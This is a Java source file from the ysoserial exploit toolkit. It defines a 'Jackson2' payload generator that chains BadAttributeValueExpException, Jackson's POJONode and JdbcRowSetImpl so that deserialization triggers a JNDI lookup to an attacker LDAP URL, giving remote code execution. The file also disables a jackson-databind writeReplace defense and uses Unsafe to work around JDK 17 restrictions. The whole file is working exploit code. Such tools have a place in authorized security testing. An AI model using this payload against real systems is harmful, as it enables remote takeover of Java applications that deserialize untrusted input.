package ysoserial.payloads;

import java.io.ObjectStreamClass;
import java.lang.reflect.Field;
import javax.management.BadAttributeValueExpException;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.rowset.JdbcRowSetImpl;
import sun.misc.Unsafe;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Jackson-databind JNDI variant via POJONode + JdbcRowSetImpl.

	Discovered by @Y4tacker. Jackson-databind research pioneered by @mbechler (marshalsec).

	Gadget chain:
		ObjectInputStream.readObject()
			BadAttributeValueExpException.readObject()
				POJONode.toString()
					InternalNodeMapper.nodeToString()
						ObjectMapper.writeValueAsString()
							[getter invocation on JdbcRowSetImpl]
								JdbcRowSetImpl.getDatabaseMetaData()
									JdbcRowSetImpl.connect()
										InitialContext.lookup(dataSourceName)
											JNDI -> RCE

	vs Jackson1:
		- No TemplatesImpl needed (JDK 17+ friendly, no --add-opens)
		- JNDI sink instead of bytecode loading
		- Argument is a JNDI URL (ldap://attacker/Exploit)

	Note: jackson-databind 2.14+ added writeReplace() defense, backported to 2.12.7.1.
	We clear it via ObjectStreamClass reflection at generation time.
	Payload works on targets with any 2.x.

	Requires:
		jackson-databind 2.x (any version on target)
 */

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.12.7.1"})
@Authors({ Authors.Y4TACKER, Authors.MBECHLER })
public class Jackson2 extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String jndiUrl) throws Exception {
		JdbcRowSetImpl rs = new JdbcRowSetImpl();
		rs.setDataSourceName(jndiUrl);
		rs.setMatchColumn("foo"); // prevent NPE during serialization

		POJONode pojoNode = new POJONode(rs);

		// Clear writeReplace from BaseJsonNode's ObjectStreamClass descriptor
		Jackson1.clearWriteReplace(POJONode.class);

		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		// JDK 17+ changed val field type from Object to String — use Unsafe to bypass
		final Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
		unsafeField.setAccessible(true);
		final Unsafe unsafe = (Unsafe) unsafeField.get(null);
		final Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
		unsafe.putObject(val, unsafe.objectFieldOffset(valField), pojoNode);

		return val;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Jackson2.class, args);
	}
}
